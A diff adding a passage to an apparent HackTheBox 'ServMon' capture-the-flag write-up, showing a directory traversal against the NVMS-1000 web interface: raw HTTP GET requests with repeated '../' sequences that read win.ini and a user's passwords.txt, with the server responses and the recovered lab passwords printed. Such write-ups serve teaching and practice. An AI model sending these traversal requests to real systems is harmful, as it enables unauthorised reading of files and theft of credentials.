@@ -199,7 +199,57 @@ Navigating to `http://10.10.10.184` returns a login page for NVMS-1000, which wa
 
 ![Login Page](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/ServMon/Images/Login%20Page.png)
 
+Searching online for NVMS-1000 reveals multiple exploit scripts for Directory Traversal attacks. ExploitDB provides a proof of concept, which we are able to recreate via Burpsuite:
 
+* [ExploitDB - POC](https://www.exploit-db.com/exploits/47774)
+
+In BurpSuite, I captured a HTTP GET request for the login page and tested for Directory traversal:
+
+```http
+GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
+```
+
+This returns a 200 HTTP response which contains the contents of `win.ini`.
+
+```http
+HTTP/1.1 200 OK
+Content-type: 
+Content-Length: 92
+Connection: close
+AuthInfo: 
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+```
+
+Now that we know the Directory Traversal attack works, we can manually exploit it to recover the contents of `C:/Users/Nathan/Desktop/passwords.txt`, as hinted at earlier in the file titled `Confidential.txt` found via FTP anonymous login vulnerability.
+
+```http
+GET /../../../../../../../../../../../../Users/Nathan/Desktop/passwords.txt HTTP/1.1
+```
+
+In the HTTP response, I can see the list of passwords:
+
+```http
+HTTP/1.1 200 OK
+Content-type: text/plain
+Content-Length: 156
+Connection: close
+AuthInfo: 
+
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+```
 
 
 
